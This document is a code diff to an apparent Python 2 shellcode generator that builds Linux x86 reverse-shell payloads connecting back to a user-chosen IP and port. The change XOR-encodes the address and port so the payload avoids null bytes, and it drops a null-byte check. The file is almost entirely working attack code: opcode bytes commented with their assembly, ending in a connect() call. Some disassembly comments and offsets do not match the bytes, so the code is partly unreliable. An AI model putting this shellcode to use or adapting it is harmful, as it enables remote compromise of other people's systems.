@@ -16,25 +16,27 @@ class Shellcode:
         if not host:
             host = "127.0.0.1"
         try:
+            address = host.split(".")
+            for k,v in enumerate(address): address[k] = str(int(v) ^ 2)
+            host = ".".join(address)
             host = socket.inet_aton(host)
         except socket.error:
             print "[-] This is not an IP adress."
             exit(1)
-        if "\x00" in host:
-            print "[-] The hex value of your IP adress contains \\x00."
-            exit(1)
-        shellcode = shellcode.replace(b"\x68\x7f\x7f\x7f\x7f", b"\x68"+host)
+        
+       
+        shellcode = shellcode.replace(b"\xb8\x7f\x7f\x7f\x7f", b"\xb8"+host)
     
         # Define port
         port = raw_input("Port [4444] : ")
         if not port:
             port = 4444      
-        port = struct.pack(">H", port)
+        port = struct.pack(">H", int(port) ^ 0x0202)
         if "\x00" in port:
             print "[-] The hex value of your port number (%s) contains \\x00." % port
             exit(1)
         else:
-            shellcode = shellcode.replace(b"\x66\x68\x41\x42", b"\x66\x68"+port)
+            shellcode = shellcode.replace(b"\x66\xb8\x41\x42", b"\x66\xb8"+port)
         
 
         return shellcode
@@ -57,15 +59,21 @@ class Shellcode:
         "\x79\xf9"               # 0x00000015:     jns 0x10
         "\x5b"                   # 0x00000017:     pop ebx
         "\x5a"                   # 0x00000018:     pop edx
-        "\x68\x7f\x7f\x7f\x7f"   # 0x00000019:     push dword 0x7f7f7f7f ; address = 127.127.127.127
-        "\x66\x68\x41\x42"       # 0x0000001E:     push word 0x4241 ; port = 0x4142
-        "\x43"                   # 0x00000022:     inc ebx
-        "\x66\x53"               # 0x00000023:     push bx
-        "\x89\xe1"               # 0x00000025:     mov ecx,esp
-        "\xb0\x66"               # 0x00000027:     mov al,0x66
-        "\x50"                   # 0x00000029:     push eax
-        "\x51"                   # 0x0000002A:     push ecx
-        "\x53"                   # 0x0000002B:     push ebx
+        "\xb8\x7f\x7f\x7f\x7f"   # 0x00000019:     mov eax,0x7f7f7f7f
+        "\x35\x02\x02\x02\x02"   # 0x00000020:     xor eax,0x02020202
+        "\x50\x66"               # 0x00000025:     push eax
+        "\x31\xc0"               # 0x00000027:     xor eax,eax
+        "\x66\xb8\x41\x42"       # 0x00000029:     mov ax,0x4241
+        "\x66\x35\x02\x02"       # 0x0000002D:     xor ax,0x0202
+        "\x66\x50"               # 0x00000032:     push ax
+        "\x31\xc0"               # 0x00000034:     xor eax,eax
+        "\x43"                   # 0x00000036:     inc ebx
+        "\x66\x53"               # 0x00000037:     push bx
+        "\x89\xe1"               # 0x00000039:     mov ecx,esp
+        "\xb0\x66"               # 0x0000003B:     mov al,0x66
+        "\x50"                   # 0x0000003C:     push eax
+        "\x51"                   # 0x0000003D:     push ecx
+        "\x53"                   # 0x0000003E:     push ebx
         "\x89\xe1"               # 0x0000002C:     mov ecx,esp
         "\x43"                   # 0x0000002E:     inc ebx
         "\xcd\x80"               # 0x0000002F:     int 0x80 ; connect()
